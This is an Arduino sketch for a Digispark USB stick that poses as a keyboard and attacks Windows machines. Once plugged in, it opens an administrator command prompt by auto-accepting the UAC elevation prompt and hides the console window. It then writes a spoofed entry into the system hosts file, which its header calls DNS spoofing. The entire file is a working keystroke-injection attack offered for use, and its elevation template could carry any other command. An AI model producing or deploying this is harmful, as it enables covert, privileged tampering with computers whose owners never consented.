#include "DigiKeyboard.h"
// DNS Spoofing using Digispark on Windows Machine!
// This script is designed for use on Windows machines with QWERTY as a keyboard layout
// Developer: AshkanRafiee
void setup() {
  // Initialize the digital pin as an output.
  pinMode(1, OUTPUT); //LED on Model A
}
void cmd_with_GUI() {
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void cmd_with_run() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell  Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
// Infinite loop
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // LED on <--> Action start
  //cmd_with_GUI(); // Open CMD in Administrator Privileges using METHOD 1 (UNCOMMENT TO USE)
  cmd_with_run(); // Open CMD in Administrator Privileges using METHOD 2 (UNCOMMENT TO USE)
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.delay(250);
  DigiKeyboard.print(F("echo. >> C:\\Windows\\System32\\drivers\\etc\\hosts"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("echo 192.168.1.1 modem >> C:\\Windows\\System32\\drivers\\etc\\hosts"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*Infinite loop to disconnect device*/ }
}
